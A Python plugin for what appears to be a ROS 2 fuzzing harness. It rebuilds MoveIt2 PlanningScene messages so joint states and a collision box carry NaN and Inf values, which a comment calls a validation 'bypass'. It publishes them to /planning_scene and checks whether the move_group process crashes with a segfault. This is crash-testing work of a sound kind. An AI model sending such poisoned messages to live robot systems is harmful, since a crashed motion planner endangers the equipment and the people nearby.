from __future__ import annotations

import math
import os
import subprocess as sp
import time
from typing import List

import rclpy
from geometry_msgs.msg import Pose
from moveit_msgs.msg import CollisionObject, PlanningScene
from sensor_msgs.msg import JointState
from shape_msgs.msg import SolidPrimitive
from target_plugins import BaseTargetPlugin


class TargetPlugin(BaseTargetPlugin):
    def __init__(self, target_config: dict, runtime_config) -> None:
        super().__init__(target_config, runtime_config)
        self._nan_axis = 0
        self._pub_node = None
        self._pub = None
        self._pub_msg_type = None
        try:
            self._topic_name = (
                self.target_config.get("fuzzing", {}).get("default_topic")
                or "/planning_scene"
            )
        except Exception:
            self._topic_name = "/planning_scene"

    def _runtime_int(self, key: str, default: int) -> int:
        try:
            return int(getattr(self.runtime_config, key, default))
        except Exception:
            return default

    def _safe_float(self, value, fallback: float = 0.0) -> float:
        try:
            v = float(value)
            if math.isfinite(v):
                return v
        except Exception:
            pass
        return fallback

    def _build_default_joint_names(self, count: int) -> List[str]:
        panda = [
            "panda_joint1",
            "panda_joint2",
            "panda_joint3",
            "panda_joint4",
            "panda_joint5",
            "panda_joint6",
            "panda_joint7",
        ]
        if count <= len(panda):
            return panda[:count]
        extra = [f"nan_joint_{i}" for i in range(len(panda), count)]
        return panda + extra

    def _extract_seed_positions(self, src_msg, count: int) -> List[float]:
        vals: List[float] = []
        try:
            raw = list(src_msg.robot_state.joint_state.position)
        except Exception:
            raw = []

        for v in raw:
            vals.append(self._safe_float(v, 0.0))
            if len(vals) >= count:
                break

        if len(vals) < count:
            vals.extend([0.0] * (count - len(vals)))
        return vals[:count]

    def _build_sanitized_scene(self, src_msg) -> PlanningScene:
        desired_count = max(1, self._runtime_int("moveit_nan_joint_count", 7))

        scene = PlanningScene()
        scene.name = "nan_poison_scene"
        scene.is_diff = True
        scene.robot_state.is_diff = True

        js = scene.robot_state.joint_state
        js.name = self._build_default_joint_names(desired_count)
        js.position = self._extract_seed_positions(src_msg, len(js.name))
        js.velocity = [0.0] * len(js.name)
        js.effort = [0.0] * len(js.name)

        co = CollisionObject()
        co.id = "nan_poison_box"
        co.header.frame_id = "panda_link0"

        prim = SolidPrimitive()
        prim.type = SolidPrimitive.BOX
        prim.dimensions = [0.04, 0.04, 0.04]
        co.primitives = [prim]

        pose = Pose()
        pose.position.x = 0.40
        pose.position.y = 0.00
        pose.position.z = 0.40
        pose.orientation.w = 1.0
        co.primitive_poses = [pose]
        co.operation = CollisionObject.ADD
        scene.world.collision_objects = [co]
        return scene

    def _normalize_joint_state(self, msg) -> None:
        desired_count = max(1, self._runtime_int("moveit_nan_joint_count", 7))

        if msg.robot_state.joint_state is None:
            msg.robot_state.joint_state = JointState()

        js = msg.robot_state.joint_state
        names = list(js.name) if js.name else []
        if len(names) == 0:
            names = self._build_default_joint_names(desired_count)

        positions = list(js.position) if js.position else []
        if len(positions) == 0:
            positions = [0.0] * len(names)
        elif len(positions) < len(names):
            positions.extend([0.0] * (len(names) - len(positions)))
        elif len(positions) > len(names):
            positions = positions[:len(names)]

        # Core bypass: keep name/position lengths identical.
        js.name = names
        js.position = [self._safe_float(v, 0.0) for v in positions]

        if len(js.velocity) not in (0, len(names)):
            js.velocity = [0.0] * len(names)
        if len(js.effort) not in (0, len(names)):
            js.effort = [0.0] * len(names)

        # Aggressive poisoning: keep lengths valid, but fill with NaN/Inf.
        for idx in range(len(js.position)):
            if idx % 2 == 0:
                js.position[idx] = float("nan")
            else:
                js.position[idx] = float("inf")
        js.velocity = [float("nan")] * len(names)
        js.effort = [float("-inf")] * len(names)

    def _ensure_collision_object(self, msg) -> CollisionObject:
        world = msg.world
        if not isinstance(world.collision_objects, list) or len(world.collision_objects) == 0:
            world.collision_objects = [CollisionObject()]

        co = world.collision_objects[0]
        if not co.id:
            co.id = "nan_poison_box"
        if not co.header.frame_id:
            co.header.frame_id = "panda_link0"

        if len(co.primitives) == 0:
            prim = SolidPrimitive()
            prim.type = SolidPrimitive.BOX
            prim.dimensions = [0.04, 0.04, 0.04]
            co.primitives = [prim]

        if len(co.primitive_poses) == 0:
            co.primitive_poses = [Pose()]

        co.operation = CollisionObject.ADD
        return co

    def _inject_nan_pose(self, co: CollisionObject) -> None:
        pose = co.primitive_poses[0]
        pose.position.x = float("nan")
        pose.position.y = float("nan")
        pose.position.z = float("nan")
        pose.orientation.x = float("nan")
        pose.orientation.y = float("nan")
        pose.orientation.z = float("nan")
        pose.orientation.w = float("nan")

        if len(co.primitives) > 0:
            dims = list(co.primitives[0].dimensions)
            while len(dims) < 3:
                dims.append(0.04)
            dims[0] = float("nan")
            dims[1] = float("nan")
            dims[2] = float("inf")
            co.primitives[0].dimensions = dims

        # Compatibility for message variants that expose a direct pose field.
        if hasattr(co, "pose"):
            co.pose.position.x = float("nan")
            co.pose.position.y = float("nan")
            co.pose.position.z = float("nan")
            co.pose.orientation.x = float("nan")
            co.pose.orientation.y = float("nan")
            co.pose.orientation.z = float("nan")
            co.pose.orientation.w = float("nan")

    def pre_exec_hook(self, msg):
        if type(msg).__name__ != "PlanningScene":
            return msg

        msg = self._build_sanitized_scene(msg)
        self._normalize_joint_state(msg)
        co = self._ensure_collision_object(msg)
        self._inject_nan_pose(co)
        self._nan_axis += 1
        return msg

    def _ensure_publisher(self, msg_type) -> None:
        if not rclpy.ok():
            rclpy.init(args=None)

        if self._pub_node is None:
            self._pub_node = rclpy.create_node(
                f"moveit2_nan_pub_{os.getpid()}"
            )

        if self._pub is None or self._pub_msg_type is not msg_type:
            self._pub = self._pub_node.create_publisher(
                msg_type, self._topic_name, 10
            )
            self._pub_msg_type = msg_type

    def publish_message(self, msg):
        self._ensure_publisher(type(msg))

        # Give DDS discovery a short grace period before first publish.
        for _ in range(10):
            if self._pub.get_subscription_count() > 0:
                break
            rclpy.spin_once(self._pub_node, timeout_sec=0.05)
            time.sleep(0.02)

        self._pub.publish(msg)
        rclpy.spin_once(self._pub_node, timeout_sec=0.05)
        time.sleep(0.05)

    def _move_group_alive(self) -> bool:
        try:
            out = sp.check_output(
                ["ps", "-C", "move_group", "-o", "stat="],
                stderr=sp.DEVNULL,
                text=True,
            )
            for line in out.splitlines():
                stat = line.strip()
                if stat and "Z" not in stat:
                    return True
            return False
        except Exception:
            return False

    def _segv_in_log(self) -> bool:
        log_path = "/tmp/moveit2_nan_crash_target.log"
        if not os.path.isfile(log_path):
            return False

        try:
            with open(log_path, "r", errors="ignore") as f:
                tail = f.read()[-16000:]
        except Exception:
            return False

        needles = [
            "SIGSEGV",
            "Segmentation fault",
            "exit code -11",
            "core dumped",
            "signal 11",
        ]
        return any(n in tail for n in needles)

    def check_oracle(self, config, msg_list, state_dict, feedback_list):
        errs = []

        tf_samples = list(state_dict.get("/tf", []))
        min_tf = max(1, self._runtime_int("moveit_nan_low_tf_threshold", 1))
        if len(tf_samples) < min_tf:
            errs.append(
                "crash suspected: no /tf activity in watch window after NaN-poisoned "
                "PlanningScene publish"
            )

        if not self._move_group_alive():
            errs.append(
                "crash suspected: move_group process disappeared (possible SIGSEGV)"
            )

        if self._segv_in_log():
            errs.append(
                "crash detected: move_group log contains SIGSEGV/segmentation-fault markers"
            )

        # de-duplicate while preserving order
        uniq = []
        for e in errs:
            if e not in uniq:
                uniq.append(e)
        return uniq
